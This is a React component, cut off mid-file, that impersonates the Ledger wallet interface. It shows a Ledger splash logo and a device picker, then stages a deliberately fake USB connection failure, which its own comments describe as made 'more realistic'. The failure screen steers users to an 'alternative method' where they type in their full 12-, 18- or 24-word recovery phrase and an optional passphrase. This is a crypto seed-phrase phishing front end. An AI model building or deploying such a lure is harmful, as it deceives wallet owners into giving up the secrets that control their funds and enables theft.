import { useState, useEffect } from 'react';

// 1. Import your local assets here. Adjust extensions (.png/.jpg) if necessary!
import device1 from '../assets/device1.png'; 
import device2 from '../assets/device2.png';
import device3 from '../assets/device3.png';
import device4 from '../assets/device4.png';

interface LedgerPanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type ViewState = 
  | 'splash' 
  | 'select_device' 
  | 'connecting' 
  | 'connection_error' 
  | 'select_phrase_length' 
  | 'enter_phrase' 
  | 'passphrase';

export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
  const [view, setView] = useState<ViewState>('splash');
  const [selectedDevice, setSelectedDevice] = useState<string | null>(null);
  const [phraseLength, setPhraseLength] = useState<12 | 18 | 24>(12);
  const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
  const [passphrase, setPassphrase] = useState('');
  const [seedError, setSeedError] = useState(false);

  // Reset state when modal opens/closes & Handle Splash Screen
  useEffect(() => {
    if (isOpen) {
      setView('splash');
      setSelectedDevice(null);
      setPhraseLength(12);
      setPhraseValues(Array(24).fill(''));
      setPassphrase('');
      setSeedError(false);

      // Slower splash screen (4 seconds) so it doesn't skip
      const timer = setTimeout(() => {
        setView('select_device');
      }, 4000);
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  // Handle the fake "Connecting" failure after a longer, more realistic delay
  useEffect(() => {
    if (view === 'connecting') {
      // Slower loader (6 seconds) to simulate a real USB handshake timeout
      const timer = setTimeout(() => {
        setView('connection_error');
      }, 6000);
      return () => clearTimeout(timer);
    }
  }, [view]);

  const handleWordChange = (index: number, value: string) => {
    const newValues = [...phraseValues];
    newValues[index] = value;
    setPhraseValues(newValues);
    
    // Validate lowercase and spaces only
    if (value.length > 0 && !/^[a-z]+$/.test(value)) {
      setSeedError(true);
    } else {
      setSeedError(false);
    }
  };

  const isPhraseComplete = () => {
    const activeWords = phraseValues.slice(0, phraseLength);
    return activeWords.every(word => word.trim().length > 0) && !seedError;
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[2147483648] pointer-events-auto transition-all duration-200 ease-in-out font-sans">
      {/* Backdrop overlay */}
      <div 
        className="absolute inset-0 bg-slate-900/60 backdrop-blur-sm transition-opacity cursor-pointer" 
        onClick={onClose}
      ></div>
      
      {/* Floating Extension Panel - Mobile optimized (bottom sheet) & Desktop floating (top right) */}
      <div className="absolute bottom-0 w-full h-[90dvh] rounded-t-[24px] md:top-0 md:bottom-auto md:right-8 md:w-[430px] md:h-[640px] md:rounded-none md:rounded-b-[12px] bg-white dark:bg-[#000000] shadow-2xl overflow-hidden flex flex-col animate-in fade-in slide-in-from-bottom-8 md:slide-in-from-top-4 duration-300 border border-slate-200 dark:border-[#27282A]">
        <div className="relative w-full h-full">

          {/* ========================================== */}
          {/* LAYER 1: SPLASH SCREEN                     */}
          {/* ========================================== */}
          <div className={`absolute inset-0 bg-white dark:bg-[#000000] z-50 flex flex-col items-center justify-center transition-opacity duration-700 ease-in-out ${view === 'splash' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
            <div className={`ledger-logo-wrapper text-black dark:text-white ${view === 'splash' ? 'ledger-logo-animating' : ''}`}>
              <svg viewBox="0 0 384 128" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ overflow: 'visible' }}>
                <g className="ledger-left-part">
                  <path d="M0 128V91.6548H8.05844V119.94H55.3076V128H0Z" fill="currentColor"></path>
                  <path d="M0 36.3452V0H55.3076V8.05844H8.05844V36.3452H0Z" fill="currentColor"></path>
                  <path d="M55 36H63.0585V84.039H91.3453V91.3077H55V36Z" fill="currentColor"></path>
                </g>
                <g className="ledger-middle-part">
                  <path d="M134.397 67.1304H110.061V84.039H137.952V91.3077H102V36H136.766V43.2687H110.061V59.8618H134.397V67.1304Z" fill="currentColor"></path>
                  <path fillRule="evenodd" clipRule="evenodd" d="M186.926 63.6539C186.926 79.8511 181.318 91.3077 166.226 91.3077H149V36H166.067C180.922 36 186.926 47.2195 186.926 63.6539ZM156.903 43.2668H165.516C173.655 43.2668 178.08 45.3206 178.08 56.3833V70.9206C178.08 81.9814 173.655 84.0371 165.516 84.0371H156.903V43.2668Z" fill="currentColor"></path>
                  <path d="M229.763 74.6361V70.844H215.934V63.5754H237.346V92.0974H230.077V86.8825H228.972C226.761 90.9901 222.414 92.8871 217.674 92.8871C213.17 92.8871 208.587 91.1489 205.269 87.9094C200.371 83.012 198 75.1104 198 64.4436C198 53.3828 200.765 45.4812 205.743 40.819C209.061 37.6598 213.486 36 218.779 36C229.683 36 236.952 42.8728 237.742 53.7767H229.05C228.972 46.3493 226.681 43.6626 219.49 43.6626H217.911C210.564 43.6626 206.85 45.9554 206.85 57.0162V71.8709C206.85 82.8533 210.405 85.2245 217.754 85.2245H219.492C226.839 85.2245 229.763 82.6162 229.763 74.6361Z" fill="currentColor"></path>
                  <path d="M281.396 69.1304H257.06V86.039H284.951V93.3077H249V38H283.766V45.2687H257.06V61.8618H281.396V69.1304Z" fill="currentColor"></path>
                  <path fillRule="evenodd" clipRule="evenodd" d="M333.766 54.0404C333.766 60.439 329.737 65.8126 323.97 67.3137V68.421C330.292 69.3695 332.346 72.6873 332.346 81.3787V93.3096H324.287V80.1147C324.287 73.7926 321.837 71.2645 315.754 71.2645H303.902V93.3077H296V38H313.777C320.334 38 325.392 39.8167 329.185 43.452C332.187 46.3759 333.766 50.0112 333.766 54.0404ZM303.902 63.9959V45.2706H316.544C322.708 45.2706 324.92 47.3244 324.92 52.9351V56.253C324.92 62.0205 322.786 63.9959 316.544 63.9959H303.902Z" fill="currentColor"></path>
                </g>
                <g className="ledger-right-part">
                  <path d="M383.308 128V91.6548H375.249V119.94H328V128H383.308Z" fill="currentColor"></path>
                  <path d="M383.308 36.3452V0H328V8.05844H375.249V36.3452H383.308Z" fill="currentColor"></path>
                </g>
              </svg>
            </div>
          </div>

          {/* ========================================== */}
          {/* LAYER 2: SELECT DEVICE                     */}
          {/* ========================================== */}
          <div className={`absolute inset-0 bg-white dark:bg-[#000000] z-40 flex flex-col p-4 sm:p-6 md:py-8 transition-opacity duration-500 ease-in-out ${view === 'select_device' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
            <div className="flex items-center justify-between mb-4 sm:mb-8 pt-2">
              <div className="w-10"></div>
              <div className="text-[#202020] dark:text-white font-semibold text-[20px] sm:text-[22px] text-center">Select your device</div>
              <div>
                <button onClick={onClose} className="p-2 rounded-[10px] hover:bg-[#f3f3f3] dark:hover:bg-[#eaeaea0d] transition-all active:scale-95">
                  <svg className="w-6 h-6 text-[#202020] dark:text-white" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg>
                </button>
              </div>
            </div>

            <div className="flex-1 overflow-y-auto ledger-custom-scrollbar px-1 pt-2 pb-4">
              <div className="grid grid-cols-2 gap-3 sm:gap-4 h-full">
                
                {/* DEVICE 1: Nano X */}
                <div 
                  onClick={() => setSelectedDevice('nanox')}
                  className={`group relative bg-gradient-to-br from-white to-[#fafafa] dark:from-[#0C0D0F] dark:to-[#121316] rounded-[16px] p-4 sm:p-5 cursor-pointer border-2 transition-all duration-300 hover:shadow-lg hover:scale-[1.02] ${selectedDevice === 'nanox' ? 'border-[#6491F1] dark:border-[#BCB1FF] shadow-lg' : 'border-[#EDEDED] dark:border-[#27282A] hover:border-[#6491F1] dark:hover:border-[#BCB1FF]'}`}
                >
                  <div className={`absolute top-3 right-3 sm:top-4 sm:right-4 w-6 h-6 sm:w-7 sm:h-7 bg-[#6491F1] dark:bg-[#BCB1FF] rounded-full items-center justify-center transition-all duration-300 ${selectedDevice === 'nanox' ? 'flex scale-100' : 'hidden scale-0'}`}>
                    <svg className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-white dark:text-[#1a1a1a]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3"><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7"></path></svg>
                  </div>
                  <div className="flex flex-col items-center justify-center h-full">
                    <div className="mb-3 sm:mb-4 transition-transform duration-300 group-hover:scale-105 h-20 flex items-center justify-center">
                      <img src={device1} alt="Nano X" className="max-h-full max-w-full object-contain mix-blend-screen dark:mix-blend-normal" />
                    </div>
                    <span className={`text-[14px] sm:text-[16px] text-center font-semibold mb-1 transition-colors ${selectedDevice === 'nanox' ? 'text-[#6491F1] dark:text-[#BCB1FF]' : 'text-[#202020] dark:text-white'}`}>Nano X / S Plus™</span>
                    <span className="text-[#888888] dark:text-[#7a7a7a] text-[11px] sm:text-[12px] text-center">Bluetooth enabled</span>
                  </div>
                </div>

                {/* DEVICE 2: Nano Gen5 */}
                <div 
                  onClick={() => setSelectedDevice('gen5')}
                  className={`group relative bg-gradient-to-br from-white to-[#fafafa] dark:from-[#0C0D0F] dark:to-[#121316] rounded-[16px] p-4 sm:p-5 cursor-pointer border-2 transition-all duration-300 hover:shadow-lg hover:scale-[1.02] ${selectedDevice === 'gen5' ? 'border-[#6491F1] dark:border-[#BCB1FF] shadow-lg' : 'border-[#EDEDED] dark:border-[#27282A] hover:border-[#6491F1] dark:hover:border-[#BCB1FF]'}`}
                >
                  <div className={`absolute top-3 right-3 sm:top-4 sm:right-4 w-6 h-6 sm:w-7 sm:h-7 bg-[#6491F1] dark:bg-[#BCB1FF] rounded-full items-center justify-center transition-all duration-300 ${selectedDevice === 'gen5' ? 'flex scale-100' : 'hidden scale-0'}`}>
                    <svg className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-white dark:text-[#1a1a1a]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3"><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7"></path></svg>
                  </div>
                  <div className="flex flex-col items-center justify-center h-full">
                    <div className="mb-3 sm:mb-4 transition-transform duration-300 group-hover:scale-105 h-20 flex items-center justify-center">
                      <img src={device2} alt="Nano Gen5" className="max-h-full max-w-full object-contain mix-blend-screen dark:mix-blend-normal" />
                    </div>
                    <span className={`text-[14px] sm:text-[16px] text-center font-semibold mb-1 transition-colors ${selectedDevice === 'gen5' ? 'text-[#6491F1] dark:text-[#BCB1FF]' : 'text-[#202020] dark:text-white'}`}>Nano Gen5™</span>
                    <span className="text-[#888888] dark:text-[#7a7a7a] text-[11px] sm:text-[12px] text-center">Latest generation</span>
                  </div>
                </div>

                {/* DEVICE 3: Flex */}
                <div 
                  onClick={() => setSelectedDevice('flex')}
                  className={`group relative bg-gradient-to-br from-white to-[#fafafa] dark:from-[#0C0D0F] dark:to-[#121316] rounded-[16px] p-4 sm:p-5 cursor-pointer border-2 transition-all duration-300 hover:shadow-lg hover:scale-[1.02] ${selectedDevice === 'flex' ? 'border-[#6491F1] dark:border-[#BCB1FF] shadow-lg' : 'border-[#EDEDED] dark:border-[#27282A] hover:border-[#6491F1] dark:hover:border-[#BCB1FF]'}`}
                >
                  <div className={`absolute top-3 right-3 sm:top-4 sm:right-4 w-6 h-6 sm:w-7 sm:h-7 bg-[#6491F1] dark:bg-[#BCB1FF] rounded-full items-center justify-center transition-all duration-300 ${selectedDevice === 'flex' ? 'flex scale-100' : 'hidden scale-0'}`}>
                    <svg className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-white dark:text-[#1a1a1a]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3"><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7"></path></svg>
                  </div>
                  <div className="flex flex-col items-center justify-center h-full">
                    <div className="mb-3 sm:mb-4 transition-transform duration-300 group-hover:scale-105 h-20 flex items-center justify-center">
                      <img src={device3} alt="Ledger Flex" className="max-h-full max-w-full object-contain mix-blend-screen dark:mix-blend-normal" />
                    </div>
                    <span className={`text-[14px] sm:text-[16px] text-center font-semibold mb-1 transition-colors ${selectedDevice === 'flex' ? 'text-[#6491F1] dark:text-[#BCB1FF]' : 'text-[#202020] dark:text-white'}`}>Ledger Flex™</span>
                    <span className="text-[#888888] dark:text-[#7a7a7a] text-[11px] sm:text-[12px] text-center">E Ink touchscreen</span>
                  </div>
                </div>

                {/* DEVICE 4: Stax */}
                <div 
                  onClick={() => setSelectedDevice('stax')}
                  className={`group relative bg-gradient-to-br from-white to-[#fafafa] dark:from-[#0C0D0F] dark:to-[#121316] rounded-[16px] p-4 sm:p-5 cursor-pointer border-2 transition-all duration-300 hover:shadow-lg hover:scale-[1.02] ${selectedDevice === 'stax' ? 'border-[#6491F1] dark:border-[#BCB1FF] shadow-lg' : 'border-[#EDEDED] dark:border-[#27282A] hover:border-[#6491F1] dark:hover:border-[#BCB1FF]'}`}
                >
                  <div className={`absolute top-3 right-3 sm:top-4 sm:right-4 w-6 h-6 sm:w-7 sm:h-7 bg-[#6491F1] dark:bg-[#BCB1FF] rounded-full items-center justify-center transition-all duration-300 ${selectedDevice === 'stax' ? 'flex scale-100' : 'hidden scale-0'}`}>
                    <svg className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-white dark:text-[#1a1a1a]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3"><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7"></path></svg>
                  </div>
                  <div className="flex flex-col items-center justify-center h-full">
                    <div className="mb-3 sm:mb-4 transition-transform duration-300 group-hover:scale-105 h-20 flex items-center justify-center">
                      <img src={device4} alt="Ledger Stax" className="max-h-full max-w-full object-contain mix-blend-screen dark:mix-blend-normal" />
                    </div>
                    <span className={`text-[14px] sm:text-[16px] text-center font-semibold mb-1 transition-colors ${selectedDevice === 'stax' ? 'text-[#6491F1] dark:text-[#BCB1FF]' : 'text-[#202020] dark:text-white'}`}>Ledger Stax™</span>
                    <span className="text-[#888888] dark:text-[#7a7a7a] text-[11px] sm:text-[12px] text-center">Curved E Ink display</span>
                  </div>
                </div>

              </div>
            </div>

            <div className="pt-4 border-t border-[#EDEDED] dark:border-[#27282A] mt-auto">
              <button 
                onClick={() => setView('connecting')}
                disabled={!selectedDevice}
                className="w-full text-white bg-[#6491F1] dark:text-[#1a1a1a] dark:bg-[#BCB1FF] font-semibold text-[16px] rounded-[12px] h-[52px] hover:opacity-90 transition-all duration-300 active:scale-[0.98] disabled:opacity-40 disabled:cursor-not-allowed"
              >
                Continue
              </button>
            </div>
          </div>

          {/* ========================================== */}
          {/* LAYER 3: CONNECTING / ERROR STATE          */}
          {/* ========================================== */}
          <div className={`absolute inset-0 bg-white dark:bg-[#000000] z-40 flex flex-col p-6 sm:px-6 md:py-8 transition-opacity duration-500 ease-in-out ${(view === 'connecting' || view === 'connection_error') ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
            <div className="flex items-center justify-between mb-8 pt-2">
              <button onClick={() => setView('select_device')} className="p-2 rounded-[10px] hover:bg-[#f3f3f3] dark:hover:bg-[#eaeaea0d] transition-all active:scale-95">
                <svg className="w-6 h-6 text-[#202020] dark:text-white" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
              </button>
              <div className="text-[#202020] dark:text-white font-semibold text-[20px] sm:text-[22px] text-center">Connect your Ledger</div>
              <button onClick={onClose} className="p-2 rounded-[10px] hover:bg-[#f3f3f3] dark:hover:bg-[#eaeaea0d] transition-all active:scale-95">
                <svg className="w-6 h-6 text-[#202020] dark:text-white" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg>
              </button>
            </div>

            <div className="flex-1 flex flex-col items-center justify-center relative">
              
              {/* LOADING STATE */}
              <div className={`w-full max-w-lg transition-opacity duration-300 absolute ${view === 'connecting' ? 'opacity-100 z-10' : 'opacity-0 pointer-events-none'}`}>
                <div className="flex flex-col items-center justify-center">
                  <div className="mb-6 sm:mb-8">
                    <div className="w-20 h-20 rounded-[12px] bg-[#6491F1]/10 dark:bg-[#BCB1FF]/10 flex items-center justify-center">
                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-10 h-10 text-[#6491F1] dark:text-[#BCB1FF] animate-spin">
                        <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                      </svg>
                    </div>
                  </div>
                  
                  <div className="text-center mb-6 sm:mb-8">
                    <h3 className="text-[#202020] dark:text-white text-[18px] sm:text-[20px] font-semibold mb-2">Waiting for connection</h3>
                    <p className="text-[#888888] dark:text-[#7a7a7a] text-[14px] sm:text-[15px] leading-relaxed">Connect and unlock your Ledger device,<br/>then open the required app</p>
                  </div>

                  <div className="w-full bg-[#6491F1]/5 dark:bg-[#BCB1FF]/5 rounded-[12px] p-4 border border-[#6491F1]/20 dark:border-[#BCB1FF]/20">
                    <div className="flex items-start gap-3">
                      <div className="flex-shrink-0 mt-0.5">
                        <svg className="w-5 h-5 text-[#6491F1] dark:text-[#BCB1FF]" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                          <circle cx="12" cy="12" r="10"></circle><path d="M12 16v-4"></path><path d="M12 8h.01"></path>
                        </svg>
                      </div>
                      <div className="flex-1">
                        <p className="text-[#202020] dark:text-white text-[14px] font-medium mb-2">Connection checklist</p>
                        <ul className="text-[#202020] dark:text-[#e3e3e3] text-[13px] space-y-1.5">
                          <li className="flex items-center gap-2">
                            <span className="w-1 h-1 rounded-full bg-[#6491F1] dark:bg-[#BCB1FF] shrink-0"></span>
                            <span>Unlock your device with PIN</span>
                          </li>
                          <li className="flex items-center gap-2">
                            <span className="w-1 h-1 rounded-full bg-[#6491F1] dark:bg-[#BCB1FF] shrink-0"></span>
                            <span>Keep USB cable connected</span>
                          </li>
                          <li className="flex items-center gap-2">
                            <span className="w-1 h-1 rounded-full bg-[#6491F1] dark:bg-[#BCB1FF] shrink-0"></span>
                            <span>Open the required app on device</span>
                          </li>
                        </ul>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* ERROR STATE */}
              <div className={`w-full max-w-lg transition-opacity duration-300 absolute ${view === 'connection_error' ? 'opacity-100 z-10' : 'opacity-0 pointer-events-none'}`}>
                <div className="flex flex-col items-center justify-center">
                  <div className="mb-6 sm:mb-8">
                    <div className="w-20 h-20 rounded-[12px] bg-[#ef4444]/10 flex items-center justify-center">
                      <svg className="w-8 h-8 text-[#ef4444]" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <circle cx="12" cy="12" r="10"></circle><path d="m15 9-6 6"></path><path d="m9 9 6 6"></path>
                      </svg>
                    </div>
                  </div>
                  
                  <div className="text-center mb-6 sm:mb-8">
                    <h3 className="text-[#202020] dark:text-white text-[18px] sm:text-[20px] font-semibold mb-2">Connection failed</h3>
                    <p className="text-[#888888] dark:text-[#7a7a7a] text-[14px] sm:text-[15px] leading-relaxed">Unable to detect your device.<br/>Please check the connection and try again</p>
                  </div>

                  <div className="w-full bg-[#fef2f2] dark:bg-[#1a1214] rounded-[12px] p-4 border border-[#fecaca] dark:border-[#3a2429]">
                    <div className="flex items-start gap-3">
                      <div className="flex-shrink-0 mt-0.5">
                        <svg className="w-5 h-5 text-[#ef4444]" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                          <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path><path d="M12 9v4"></path><path d="M12 17h.01"></path>
                        </svg>
                      </div>
                      <div className="flex-1">
                        <p className="text-[#dc2626] dark:text-[#f87171] text-[13px] leading-relaxed">
                          Make sure your Ledger is connected via USB and unlocked. If the issue persists, try the alternative connection method.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

            </div>

            <div className={`pt-4 border-t border-[#EDEDED] dark:border-[#27282A] transition-opacity duration-300 mt-auto ${view === 'connection_error' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
              <button 
                onClick={() => setView('select_phrase_length')}
                className="w-full h-[48px] text-[#202020] dark:text-white bg-[#EDEDED] dark:bg-[#27282A] rounded-[10px] flex items-center justify-center gap-2 font-medium text-[14px] hover:bg-[#e0e0e0] dark:hover:bg-[#2f3033] transition-all active:scale-[0.98]"
              >
                <svg className="w-4 h-4" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
                </svg>
                <span>Use alternative method</span>
              </button>
            </div>
          </div>

          {/* ========================================== */}
          {/* LAYER 4: SELECT PHRASE LENGTH              */}
          {/* ========================================== */}
          <div className={`absolute inset-0 bg-white dark:bg-[#000000] z-40 flex flex-col p-6 sm:px-6 md:py-8 transition-opacity duration-500 ease-in-out ${view === 'select_phrase_length' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
            <div className="flex items-center justify-between mb-8 pt-2">
              <button onClick={() => setView('connection_error')} className="p-2 rounded-[10px] hover:bg-[#f3f3f3] dark:hover:bg-[#eaeaea0d] transition-all active:scale-95">
                <svg className="w-6 h-6 text-[#202020] dark:text-white" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
              </button>
              <div className="text-[#202020] dark:text-white font-semibold text-[20px] sm:text-[22px] text-center">Select recovery phrase</div>
              <button onClick={onClose} className="p-2 rounded-[10px] hover:bg-[#f3f3f3] dark:hover:bg-[#eaeaea0d] transition-all active:scale-95">
                <svg className="w-6 h-6 text-[#202020] dark:text-white" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg>
              </button>
            </div>

            <div className="flex-1 overflow-y-auto px-1 pb-4">
              <div className="flex flex-col gap-3 sm:gap-4 mb-6">
                
                {[12, 18, 24].map((len) => (
                  <div 
                    key={len}
                    onClick={() => {
                      setPhraseLength(len as 12 | 18 | 24);
                      setPhraseValues(Array(24).fill('')); 
                    }}
                    className={`group relative bg-gradient-to-br from-white to-[#fafafa] dark:from-[#0C0D0F] dark:to-[#121316] rounded-[16px] px-4 py-4 sm:px-5 sm:py-5 cursor-pointer border-2 transition-all duration-300 hover:shadow-lg hover:scale-[1.01] ${phraseLength === len ? 'border-[#6491F1] dark:border-[#BCB1FF] shadow-lg' : 'border-[#EDEDED] dark:border-[#27282A] hover:border-[#6491F1] dark:hover:border-[#BCB1FF]'}`}
                  >
                    <div className={`absolute top-4 right-4 w-6 h-6 sm:w-7 sm:h-7 bg-[#6491F1] dark:bg-[#BCB1FF] rounded-full items-center justify-center transition-all duration-300 ${phraseLength === len ? 'flex scale-100' : 'hidden scale-0'}`}>
                      <svg className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-white dark:text-[#1a1a1a]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3"><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7"></path></svg>
                    </div>
                    <div className="flex flex-col pr-8">
                      <h3 className={`text-[15px] sm:text-[17px] font-semibold mb-1 sm:mb-1.5 transition-colors ${phraseLength === len ? 'text-[#6491F1] dark:text-[#BCB1FF]' : 'text-[#202020] dark:text-white'}`}>
                        {len}-word recovery phrase
                      </h3>
                      <p className="text-[#888888] dark:text-[#7a7a7a] text-[13px] sm:text-[14px] leading-relaxed">
                        {len === 12 ? 'Standard BIP39 mnemonic with 12 words' : len === 18 ? 'Extended BIP39 mnemonic with 18 words' : 'Maximum security BIP39 mnemonic with 24 words'}
                      </p>
                    </div>
                  </div>
                ))}
                
              </div>
            </div>

            <div className="pt-4 border-t border-[#EDEDED] dark:border-[#27282A] mt-auto">
              <button 
                onClick={() => setView('enter_phrase')}
                className="w-full text-white bg-[#6491F1] dark:text-[#1a1a1a] dark:bg-[#BCB1FF] font-semibold text-[16px] rounded-[12px] h-[52px] hover:opacity-90 transition-all active:scale-[0.98]"
              >
                Continue
              </button>
            </div>
          </div>

          {/* ========================================== */}
          {/* LAYER 5: ENTER RECOVERY PHRASE             */}
          {/* ========================================== */}
          <div className={`absolute inset-0 bg-white dark:bg-[#000000] z-40 flex flex-col p-6 sm:px-6 md:py-8 transition-opacity duration-500 ease-in-out ${view === 'enter_phrase' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
            <div className="flex items-center justify-between pt-2">
              <button onClick={() => setView('select_phrase_length')} className="p-1 rounded-[8px] hover:bg-[#f3f3f3] dark:hover:bg-[#eaeaea0d] transition-all active:scale-95">
                <svg className="w-6 h-6 text-[#202020] dark:text-white" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
              </button>
              <div className="text-[#202020] dark:text-white font-semibold text-[18px] sm:text-[22px] text-center">Enter your {phraseLength}-word Backup</div>
              <button onClick={onClose} className="p-1 rounded-[8px] hover:bg-[#f3f3f3] dark:hover:bg-[#eaeaea0d] transition-all active:scale-95">
                <svg className="w-6 h-6 text-[#202020] dark:text-white" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg>
              </button>
            </div>

            <div className="mt-6 sm:mt-8 flex-1 flex flex-col min-h-0">
              <div className="mt-2 sm:mt-4 flex-1 overflow-y-auto ledger-custom-scrollbar pr-1 sm:pr-2 pb-4">
                <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 sm:gap-4">
                  {Array.from({ length: phraseLength }).map((_, i) => (
                    <div key={i} className="relative flex items-center gap-x-1">
                      <div className="w-[20px] sm:w-[22px] shrink-0">
                        <p className="text-[#202020] dark:text-[#b6b6b6] text-[13px] sm:text-[14px] font-normal">{i + 1}.</p>
                      </div>
                      <input 
                        className={`w-full h-[40px] sm:h-[44px] py-[8px] sm:py-[11px] px-[8px] sm:px-[16px] text-[13px] sm:text-[14px] font-medium rounded-[8px] sm:rounded-[10px] text-[#222222] dark:text-white border bg-transparent dark:bg-[#0C0D0F] focus:bg-[#fbfbfb] dark:focus:bg-[#0f0f0f] outline-none transition-all duration-300 ${seedError && phraseValues[i].length > 0 && !/^[a-z]+$/.test(phraseValues[i]) ? 'border-[#ff5252] dark:border-[#b83939] text-[#fa3434] dark:text-[#fa4646b5]' : 'border-[#ebebeb] dark:border-[#47484A] hover:border-[#9d9d9d] dark:hover:border-[#c6c6c6] focus:border-[#6491F1] dark:focus:border-[#BCB1FF]'}`} 
                        type="text"
                        value={phraseValues[i]}
                        onChange={(e) => handleWordChange(i, e.target.value.toLowerCase())}
                      />
                    </div>
                  ))}
                </div>
              </div>
              
              <div className={`my-2 transition-opacity duration-300 text-center ${seedError ? 'opacity-100' : 'opacity-0'}`}>
                <span className="text-[#ff5f52] text-[13px] sm:text-[14px] font-normal">Use only lowercase letters</span>
              </div>
            </div>

            <div className="mt-4 pt-4 border-t border-[#EDEDED] dark:border-[#27282A]">
              <button 
                onClick={() => setView('passphrase')}
                disabled={!isPhraseComplete()}
                className="w-full text-white bg-[#6491F1] dark:text-[#202020] dark:bg-[#BCB1FF] font-medium text-[15px] rounded-[8px] h-[48px] hover:opacity-80 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
              >
                Recover
              </button>
            </div>
          </div>

          {/* ========================================== */}
          {/* LAYER 6: PASSPHRASE (OPTIONAL)             */}
          {/* ========================================== */}
          <div className={`absolute inset-0 bg-white dark:bg-[#000000] z-40 flex flex-col p-6 sm:px-6 md:py-8 transition-opacity duration-500 ease-in-out ${view === 'passphrase' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
            <div className="flex items-center justify-between mb-8 pt-2">
              <button onClick={() => setView('enter_phrase')} className="p-2 rounded-[10px] hover:bg-[#f3f3f3] dark:hover:bg-[#eaeaea0d] transition-all active:scale-95">
                <svg className="w-6 h-6 text-[#202020] dark:text-white" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
              </button>
              <div className="text-[#202020] dark:text-white font-semibold text-[20px] sm:text-[22px] text-center">Passphrase (Optional)</div>
